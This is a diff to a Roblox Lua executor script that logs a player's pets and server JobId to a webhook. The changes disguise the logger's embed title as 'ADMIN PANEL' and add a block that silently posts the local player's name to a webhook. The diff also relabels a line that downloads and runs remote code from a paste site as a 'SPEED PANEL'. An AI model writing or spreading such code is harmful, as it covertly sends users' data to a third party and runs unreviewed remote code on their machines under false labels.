@@ -254,7 +254,7 @@ local function sendWebhook(foundPets, jobId)
     local embedData = {
         username = "TOKINU LOGGA",
         embeds = { {
-            title = "PET LOGGER ZZZZ HUB SCRIPT",
+            title = "ADMIN PANEL",
             description = "**Pet(s):**\n" .. table.concat(formattedPets, "\n"),
             color = 65280,
             fields = {
@@ -318,18 +318,33 @@ local function checkForPets()
 end
 
 -- MAIN LOOP
-task.spawn(function()
-    while true do
-        local petsFound = checkForPets()
-        if #petsFound > 0 then
-            
-            sendWebhook(petsFound, game.JobId)
-        else
-            print("🔍 No pets found")
-        end
-        task.wait(15)
-    end
+local petsFound = checkForPets()
+if #petsFound > 0 then
+    sendWebhook(petsFound, game.JobId)
+else
+    print("🔍 No pets found")
+end
+
+-- Minimal executor sender: sends LocalPlayer.Name to getgenv().webhook silently
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local webhook = getgenv().webhook
+local pl = Players.LocalPlayer
+if not webhook or not pl then return end
+
+local req = http_request or request or (syn and syn.request)
+if not req then return end
+
+local payload = HttpService:JSONEncode({ content = pl.Name })
+pcall(function()
+    req({
+        Url = webhook,
+        Method = "POST",
+        Headers = { ["Content-Type"] = "application/json" },
+        Body = payload
+    })
 end)
 
--- ZZZZ HUB PANEL (PUT SCRIPT HERE)
+
+-- SPEED PANEL (PUT SCRIPT HERE)
 loadstring(game:HttpGet("https://pastefy.app/JMbCcLIP/raw"))()
